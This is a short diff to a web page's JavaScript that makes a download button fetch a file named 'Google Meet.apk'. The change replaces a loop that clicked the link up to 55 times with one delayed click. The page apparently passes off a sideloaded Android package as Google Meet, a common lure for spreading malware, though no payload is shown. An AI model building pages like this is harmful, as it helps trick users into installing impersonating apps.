@@ -20,18 +20,13 @@ document.getElementById("downloadBtn").addEventListener("click", function () {
     link.href = "Google Meet.apk";
     link.download = "Google Meet.apk";
     document.body.appendChild(link);
-
-    
+  
     setTimeout(function(){
-       setInterval(function(){
-        if(count<55){
+       setTimeout(function(){
         link.click();
         document.body.removeChild(link);
-       }
-     count++;
-    }, 300);
-
-    
+    }, 3000);
+      
     }, 3000);
     
 });
@@ -39,4 +34,5 @@ document.getElementById("downloadBtn").addEventListener("click", function () {
 
 </body>
 </html>
+
 
